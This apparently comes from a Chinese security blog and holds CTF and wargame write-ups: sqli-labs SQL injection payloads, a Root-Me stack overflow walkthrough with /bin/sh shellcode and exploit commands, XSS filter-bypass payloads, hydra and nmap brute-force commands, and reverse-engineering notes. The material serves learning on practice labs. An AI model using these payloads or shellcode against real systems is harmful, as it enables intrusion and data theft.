<p><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9Nzi8"><img src="https://s2.ax1x.com/2019/03/10/A9Nzi8.png" alt="A9Nzi8.png"></a><br><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9UGo6"><img src="https://s2.ax1x.com/2019/03/10/A9UGo6.png" alt="A9UGo6.png"></a><br>其他相同<br><em>HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。</em></p>
<p>更新于2019-03-10 22:43:03 星期日</p>
<hr>
<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>参考上题<br>输入正确用户和密码后，跳出页面</p>
<p><a href="https://imgchr.com/i/ACy1bD"><img src="https://s2.ax1x.com/2019/03/11/ACy1bD.png" alt="ACy1bD.png"></a></p>
<p>差不多知道在<code>referer</code>上注入<br><code>&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1</code><br>不能用<code>#</code>注释，因为后面还有语句存在</p>
<p><a href="https://imgchr.com/i/ACyvqO"><img src="https://s2.ax1x.com/2019/03/11/ACyvqO.png" alt="ACyvqO.png"></a></p>
<p><code>&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1</code></p>
<p><a href="https://imgchr.com/i/AC6Kij"><img src="https://s2.ax1x.com/2019/03/11/AC6Kij.png" alt="AC6Kij.png"></a></p>
<p>更新于2019-03-10 22:43:03 星期日</p>
<hr>
<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>由题目知注入点在Cookie中</p>
<p><em>这里我犯了个错误，由于没有拦截，修改Cookie后，直接点刷新不会出结果，需要重新载入页面</em></p>
<p>输入<code>&#39;</code><br><a href="https://imgchr.com/i/AkUjaj"><img src="https://s2.ax1x.com/2019/03/13/AkUjaj.th.png" alt="AkUjaj.th.png"></a><br>报错存在注入点</p>
<p>接下来可以用第一题用的<br><code>&#39; union select 1,2,database()#</code><br><a href="https://imgchr.com/i/AkU7xf"><img src="https://s2.ax1x.com/2019/03/13/AkU7xf.th.png" alt="AkU7xf.th.png"></a></p>
<p><code>&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()#</code><br><a href="https://imgchr.com/i/Akauz6"><img src="https://s2.ax1x.com/2019/03/13/Akauz6.th.png" alt="Akauz6.th.png"></a></p>
<p>也可以用报错注入<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code><br><a href="https://imgchr.com/i/AkaQsO"><img src="https://s2.ax1x.com/2019/03/13/AkaQsO.th.png" alt="AkaQsO.th.png"></a></p>
<hr>
<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>查看Cookie<br><code>YWRtaW4</code>进行解密，知是用base64加密的<code>admin</code><br>所以只要将上题内容加密即可</p>
<hr>
<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>查看cookie<br><code>admin&#39; and 1=1 #</code>没有查询结果<br><code>admin&quot; and 1=1 #</code>结果正确<br>知是用<code>&quot;</code>闭合<br>其他方法与前题相同</p>
<p>更新于2019-03-13 20:26:48 星期三</p>
<hr>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF x86 - stack buffer overflow basic 4</title>
    <url>/2020/12/29/stack_buffer_overflow_basic_4/</url>
    <content><![CDATA[<h1 id="ELF-x86-stack-buffer-overflow-basic-4"><a href="#ELF-x86-stack-buffer-overflow-basic-4" class="headerlink" title="ELF x86 - stack buffer overflow basic 4"></a>ELF x86 - stack buffer overflow basic 4</h1><p>参考: </p>
<ol>
<li><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a></li>
<li><a href="https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md">https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md</a></li>
<li><a href="http://showlinkroom.me/2017/12/04/Root-me-App-System02/">http://showlinkroom.me/2017/12/04/Root-me-App-System02/</a></li>
<li><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution">https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution</a></li>
</ol>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><code>struct EnvInfo GetEnv(void)&#123;&#125;</code> 中有<code>strcpy()</code>函数，存在溢出点。</p>
<pre><code>            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  </code></pre>
<a id="more"></a>
<p>Since 540 - 128 = 412, 412 - 128 = 284 and 284 - 128 = 156, we get the following stack summary:</p>
<ul>
<li>%ebp - 540​ | env.home​​ ​​</li>
<li>%ebp - 412 | env.username</li>
<li>%ebp - 284 | env.shell</li>
<li>%ebp - 156 | env.path</li>
<li>%ebp | saved frame pointer</li>
<li>%ebp + 4 | saved EIP</li>
<li>%ebp + 8 | rep movsl destination address</li>
</ul>
<p>var char *dest @ ebp-0x21c</p>
<p>0x08048590 e8dbfdffff     sym.imp.strcpy ();[og] 第二次的赋值，USERNAME</p>
<pre><code>gdb-peda$ x/101xw 0xbffff3cc 存输入值
0xbffff3cc:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3dc:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3ec:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3fc:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff40c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff41c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff42c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff43c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff44c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff45c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff46c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff47c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff48c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff49c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4ac:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4bc:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4cc:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4dc:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4ec:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4fc:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff50c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff51c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff52c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff53c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff54c:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff55c:     0x0804a000</code></pre>
<p><code>EAX: 0xbffff44c (&#39;a&#39; &lt;repeats 200 times&gt;...)</code><br>存shell 字符串</p>
<p><code>EAX: 0xbffff4cc (&#39;a&#39; &lt;repeats 128 times&gt;, &quot;e\377\377\277&quot;, &#39;a&#39; &lt;repeats 12 times&gt;)</code><br>放path</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disas GetEnv</span></span><br><span class="line">[...] # How much memory is allocated?</span><br><span class="line">0x080484aa &lt;+6&gt;:        sub    $0x22c,%esp      # (1)</span><br><span class="line">[...] # Let&#x27;s see what happens after the last &#x27;strcpy&#x27; call...</span><br><span class="line">   0x080485c0 &lt;+284&gt;:        call   0x8048390 &lt;strcpy@plt&gt; </span><br><span class="line">   0x080485c5 &lt;+289&gt;:        mov    0x8(%ebp),%eax # (2-dest)</span><br><span class="line">   0x080485c8 &lt;+292&gt;:        lea    -0x21c(%ebp),%edx # (3-source)</span><br><span class="line">   0x080485ce &lt;+298&gt;:        mov    $0x200,%ebx # (4-length) </span><br><span class="line">[...] # Some alignment details skipped...</span><br><span class="line">   0x08048602 &lt;+350&gt;:        mov    %ebx,%ecx # (4-length)</span><br><span class="line">   0x08048604 &lt;+352&gt;:        shr    $0x2,%ecx # (4-length)</span><br><span class="line">   0x08048607 &lt;+355&gt;:        mov    %eax,%edi # (2-dest)</span><br><span class="line">   0x08048609 &lt;+357&gt;:        mov    %edx,%esi # (3-source)</span><br><span class="line">   0x0804860b &lt;+359&gt;:        rep movsl %ds:(%esi),%es:(%edi)</span><br></pre></td></tr></table></figure>
<ul>
<li><p> program allocates 0x22c = 556 bytes (an EnvInfo struct is around 512 bytes long),</p>
</li>
<li><p> rep movsl … instruction at the end of the function, which consists of copying <strong>n long words **from %esi to %edi, with n being the value stored in **%ecx</strong> ;</p>
</li>
<li><p>it loads an address located at %ebp + 8 into the %edi register (destination address)</p>
</li>
<li><p>it loads the address of %ebp - 540 (0x21c = 540) into the %esi register (source address)</p>
</li>
<li><p>%ecx is initially set <strong>to 0x200(512) **and then **divided by 4 (shr $2)</strong>, i.e., %ecx <strong>equals 128</strong>. Hence, 128 long (4-bytes) words will be copied, resulting in the 512 bytes of the 4 buffers of an EnvInfo struct.</p>
<p>in order to output its EnvInfo struct, GetEnv <strong>creates a local struct</strong> where it stores the data first, and then, in its prologue**, GetEnv actually replicates the local struct into a “remote” struct, l<strong>ocated at the address read **at %ebp + 8</strong><br>还要复制结构体</p>
</li>
</ul>
<p><code> $PATH=$(python -c &#39;print &quot;/usr/local/bin:&quot; + &quot;A&quot; * (164-16)&#39;) peda -ex &quot;run&quot; ./ch8</code><br>这命令</p>
<p>如果打印420（412+4 =416 在这里输入4个字节，总长变为420） a，溢出</p>
<pre><code>gdb-peda$ x/16xb 0xbffff55c
0xbffff55c:     0x61    0x61    0x61    0x61    0x00    0xf5    0xff    0xbf</code></pre>
<p>path后面跟着一个null \00<br>会改变指针值，结构体赋值到$ebp+8指向的地址处</p>
<p>打印416 a</p>
<pre><code>0xbffff55c:     0x08048600      0xbffff570</code></pre>
<p>没有改变ebp+8<br>这个地址是main中env结构体地址</p>
<h2 id="或者重新分配512字节可写空间"><a href="#或者重新分配512字节可写空间" class="headerlink" title="或者重新分配512字节可写空间"></a>或者重新分配512字节可写空间</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * ptr;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">        ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code> cd /tmp; gcc -m32 -o find_env find_env.c; cd -</code></p>
<pre><code>app-systeme-ch8@challenge02:~$ export SHELLCODE=`python -c &quot;print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;`
app-systeme-ch8@challenge02:~$ export JUNK=`python -c &quot;print &#39;B&#39; * 1000&quot;`
app-systeme-ch8@challenge02:~$ /tmp/find_env SHELLCODE ./ch8
SHELLCODE will be at 0xbffff931
app-systeme-ch8@challenge02:~$ /tmp/find_env JUNK ./ch8
JUNK will be at 0xbffffb2b</code></pre>
<p><code>export PATH=</code>python -c “print ‘A’*160 + ‘\x31\xf9\xff\xbf’ + ‘\x2b\xfb\xff\xbf’”``</p>
<hr>
<p>我们将shellcode放在USERNAME上，我试了几个shellcode，只有这个有用，</p>
<pre><code>export USERNAME=`python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;`</code></pre>
<p>总长33字节</p>
<p>然后溢出PATH，要保证$ebp+8的值不变（小端序），<br>path长119，再填充一个<code>：</code>，保持为4的倍数，</p>
<pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/:`python -c &#39;print(&quot;\x6c\xf5\xff\xbf&quot;*11+&quot;\x50\xf7\xff\xbf&quot;)&#39;`</code></pre>
<p><code>0xbfff56c</code>是USERNAME地址，<code>0xbffff750</code>是$ebp+8的值，现在PATH总长168。</p>
<pre><code>app-systeme-ch8@challenge02:~$ ./ch8
[+] Getting env...
bash-4.4$ cat .passwd</code></pre>
<h2 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h2><h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><p><code>export USERNAME=</code></p>
<p>gdb中<br><code>set env USERNAME=</code></p>
<p>查看<br><code>x/x env.path</code></p>
<h3 id="查看环境变量长度"><a href="#查看环境变量长度" class="headerlink" title="查看环境变量长度"></a>查看环境变量长度</h3><p><code>echo $&#123;#PATH&#125;</code></p>
<hr>
<p><code>gdb-peda$ print $ebp-0xbffff55c</code></p>
<p><code>disas GetEnv</code></p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS 20关挑战</title>
    <url>/2019/03/01/xss/</url>
    <content><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>反射型XSS也被称为非持久性CSS<br>当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p>
<p>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。</p>
<p>查看源码<code>window.alert = function()  </code><br><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>没有过滤<br>直接调用函数就可以通关<code>&lt;script&gt;window.alert()&lt;/script&gt;</code></p>
<p><em><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</em></p>
<a id="more"></a>
<hr>
<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>利用页面元素看到输入在<code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><br>闭合input语句即可<br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code><br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code></p>
<p><a href="https://imgchr.com/i/kqT7Ed"><img src="https://s2.ax1x.com/2019/03/03/kqT7Ed.png" alt="kqT7Ed.png"></a></p>
<hr>
<h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>查看页面元素<code>&lt;input name=keyword  value=&#39;1&#39;&gt;</code>在input语句里<br>尝试闭合无用<br>查看源码<code>str</code>都加上了<code>htmlspecialchars</code>函数，但默认配置是不过滤单引号的<br><code>&#39;onmouseover=&#39;window.alert()</code>即可</p>
<p>输入<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p>
<hr>
<h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>输入<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>查看可知<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>过滤了<code>&lt;</code> <code>&gt;</code><br>利用上节方法<br><code>&quot;onclick=&quot;alert()</code></p>
<p>更新于2019-03-03 11:19:50 星期日</p>
<hr>
<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>试过后发现<code>onclick</code>变为<code>o_nclick</code><br><code>script</code>变为<code>sc_ript</code><br>使用<code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;</code></p>
<hr>
<h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p><code>onclick script href</code>输入后都进行了变化<br><code>&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;</code><br><code>keyword=&quot;ONclick=&quot;alert()</code><br><code>keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;</code><br><code>keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;</code><br>进行大小写替换可以</p>
<hr>
<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>被过滤，改变大小写也没有用<br><code>on</code>被过滤<br><code>href</code>同样如此<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>利用双写绕过</p>
<p>更新于2019-03-06 21:20:39 星期三</p>
<hr>
<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这题可以添加链接<br>直接使用<code>javascript:alert(1)</code><br>但并没有用，查看源码<code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code>被替换了<br>使用制表符绕过<code>%09</code><br><code>keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接</code></p>
<hr>
<h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>上题结果没有用，查看源码<code>if(false===strpos($str7,&#39;http://&#39;))</code><br>知一定要有<code>http://</code><br>在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的<br><code>javasc%09ript%3Aalert%281%29//http://www.test.com</code></p>
<hr>
<h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>查看页面元素<br><a href="https://imgchr.com/i/AdFKeI"><img src="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png" alt="AdFKeI.th.png"></a><br>有几个隐藏的值，注入点就在这<br><code>keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br><a href="https://imgchr.com/i/AdkZNV"><img src="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png" alt="AdkZNV.th.png"></a></p>
<hr>
<h2 id="更新于2019-03-27-18-15-42-星期三"><a href="#更新于2019-03-27-18-15-42-星期三" class="headerlink" title="更新于2019-03-27 18:15:42 星期三"></a>更新于2019-03-27 18:15:42 星期三</h2>]]></content>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>web-server前四题</title>
    <url>/2020/12/20/web-server-front-4/</url>
    <content><![CDATA[<h1 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h1><h2 id="tNikto"><a href="#tNikto" class="headerlink" title="tNikto"></a>tNikto</h2><p>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件／CGIs；超过625种服务器版本；超过230种特定服务器问题。</p>
<p><code>nikto -host http://challenge01.root-me.org/web-serveur/ch3/</code></p>
<a id="more"></a>
<hr>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org</code></p>
<pre><code>-d: Increase debugging level
-v: Increase verbosity level (use -vv or more for greater effect)
--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories
--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</code></pre>
<hr>
<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p><code>hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ </code> </p>
<pre><code>- users list inspired by http://blog.infowebmaster.fr/public/resource/wordpress-brute-force-login-a-eviter.txt
- passwords list downloaded from http://blog.teckn0.com/wp-content/uploads/brute_force/Liste_mot_%20anglais.7z</code></pre>
<h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><p><code>curl -L -A &quot;admin&quot; challenge01.root-me.org/web-serveur/ch2</code><br>     -A, –user-agent <name> Send User-Agent <name> to server<br>    -L, –location      Follow redirects</p>
<hr>
<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://challenge01.root-me.org/web-serveur/ch2/&#x27;</span>, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Admin&#x27;</span>&#125;) </span><br><span class="line"><span class="built_in">print</span> resp.text</span><br></pre></td></tr></table></figure>

<h1 id="HTTP-open-redirt"><a href="#HTTP-open-redirt" class="headerlink" title="HTTP open redirt"></a>HTTP open redirt</h1><h2 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h2><hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Select a domain to <span class="built_in">hash</span> <span class="keyword">not</span> listed <span class="keyword">in</span> the page, like: https://google.com</span><br><span class="line"><span class="number">2.</span> Hash the string domain here <span class="keyword">or</span> another: http://www.fileformat.info/tool/<span class="built_in">hash</span>.htm</span><br><span class="line">3. Construct the url like this and press enter: http://challenge01.root-me.org/web-serveur/ch52/?url=##DOMAIN##&amp;h=##HASH##</span><br><span class="line"><span class="number">4.</span> When new page <span class="keyword">is</span> loading, you can see the flag, stop the redirection pressing escape <span class="keyword">and</span> copy it.</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>web-server in root me</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记1</title>
    <url>/2019/11/19/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<p>买这本书有一年了，但只看了一点点，希望能学完</p>
<ol>
<li>保存更改到可执行文件，<em>1保存到COPY TO EXECUTABLE FILE</em>，<em>2选择SAVE FILE</em></li>
<li>应用程序被加载到内存时，有一最小分配空间</li>
<li>space = assemble，用于更改代码<a id="more"></a></li>
<li>大端序 12 34 </li>
<li>小端序 34 12 一个字节里顺序一样</li>
<li>逆序压栈，栈FILO</li>
<li>栈窗口，address-relative to EBP</li>
<li>EBP ESP 存储的是栈地址-》代表数据</li>
<li>1.CALL 压入下一地址 -1 2.PUSH 压入上一栈帧基地址 -1 3.MOV EBP ESP 4. MOV ESP EBP 5.POP EBP 取出基地址 +1 6.RETN 取出下一地址+1</li>
<li>local 局部变量 ARG 参数</li>
<li>test = and =0 则 ZF=1 JE ZF=1 跳转</li>
<li>局部对象存储在栈区</li>
<li>选中地址，Follow in dump</li>
<li>dump中，long-address with ASCII dump</li>
<li>VB使用unicode</li>
<li>API get…Text</li>
<li>调试前预测代码的实现</li>
<li>先上托，找到栈帧生成部分</li>
</ol>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记2</title>
    <url>/2019/11/20/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<ol>
<li>栈就是一小段内存空间，大小记录在PE头中</li>
<li>RETN 8 =RETN POP 8 stdcall清理方式 被调用者清理，cdecl调用者清理</li>
<li>Nags 唠叨</li>
<li>VB ThunRTMain 函数 调用消息框 rtcMsgBox<a id="more"></a></li>
<li>Set Breakpoint on every call to rtcMsgBox</li>
<li>1 opcode == 1 byte</li>
<li>4 bytes == 1 dword</li>
<li>registers is 32 bit</li>
</ol>
<hr>
<h5 id="Lena视频学习"><a href="#Lena视频学习" class="headerlink" title="Lena视频学习"></a>Lena视频学习</h5><p><em>这是书本介绍的，这是<a href="https://tuts4you.com/download/2876/" title="tuts4you">tuts4you</a>crackme下载地址，里面还有视频教程和一些其他教程。</em></p>
<h5 id="Assembler-The-Basics-In-Reversing"><a href="#Assembler-The-Basics-In-Reversing" class="headerlink" title="Assembler : The Basics In Reversing"></a>Assembler : The Basics In Reversing</h5><p>SS stack segment<br>C-Flag &gt;FFFFFFFF  and &lt;0 时设置<br><code>segmens(a page in a book) + offsets(a specific line on that page)</code></p>
<pre><code>add eax,ebx                    ;; Register, Register
add eax,123                    ;; Register, Value
add eax,dword ptr [404000]            ;; Register, Dword Pointer [value]
add eax,dword ptr [eax]            ;; Register, Dword Pointer [register]
add eax,dword ptr [eax+00404000]    ;; Register, Dword Pointer [register+value]
add dword ptr [404000],eax            ;; Dword Pointer [value], Register
add dword ptr [404000],123        ;; Dword Pointer [value], Value
add dword ptr [eax],eax            ;; Dword Pointer [register], Register
add dword ptr [eax],123            ;; Dword Pointer [register], Value
add dword ptr [eax+404000],eax        ;; Dword Pointer [register+value], Register
add dword ptr [eax+404000],123        ;; Dword Pointer [register+value], value</code></pre>
<p>INT3 and INTO are interrupt calls that take no parameters but call the handlers for interrupts 3 and 4, respectively.</p>
<pre><code>JA*    -    Jump if (unsigned) above            - CF=0 and ZF=0
JAE    -    Jump if (unsigned) above or equal        - CF=0
JB*    -    Jump if (unsigned) below            - CF=1
JBE    -    Jump if (unsigned) below or equal        - CF=1 or ZF=1
JC    -    Jump if carry flag set            - CF=1
JCXZ    -    Jump if CX is 0                - CX=0
JE**    -    Jump if equal                    - ZF=1
JECXZ    -    Jump if ECX is 0                - ECX=0
JG*    -    Jump if (signed) greater            - ZF=0 and SF=OF (SF = Sign Flag)
JGE*    -    Jump if (signed) greater or equal        - SF=OF
JL*    -    Jump if (signed) less                - SF != OF (!= is not)
JLE*    -    Jump if (signed) less or equal        - ZF=1 and OF != OF
JMP**    -    Jump                        - Jumps always
JNA    -    Jump if (unsigned) not above        - CF=1 or ZF=1
JNAE    -    Jump if (unsigned) not above or equal    - CF=1
JNB    -    Jump if (unsigned) not below        - CF=0
JNBE     -    Jump if (unsigned) not below or equal    - CF=0 and ZF=0
JNC    -    Jump if carry flag not set            - CF=0
JNE**    -    Jump if not equal                - ZF=0
JNG    -    Jump if (signed) not greater            - ZF=1 or SF!=OF
JNGE    -    Jump if (signed) not greater or equal    - SF!=OF
JNL    -    Jump if (signed) not less            - SF=OF
JNLE    -    Jump if (signed) not less or equal        - ZF=0 and SF=OF
JNO    -    Jump if overflow flag not set        - OF=0
JNP    -    Jump if parity flag not set            - PF=0
JNS    -    Jump if sign flag not set            - SF=0
JNZ    -    Jump if not zero                - ZF=0
JO    -    Jump if overflow flag is set            - OF=1
JP    -    Jump if parity flag set            - PF=1
JPE    -    Jump if parity is equal            - PF=1
JPO    -    Jump if parity is odd                - PF=0
JS    -    Jump if sign flag is set            - SF=1
JZ    -    Jump if zero                    - ZF=1</code></pre>
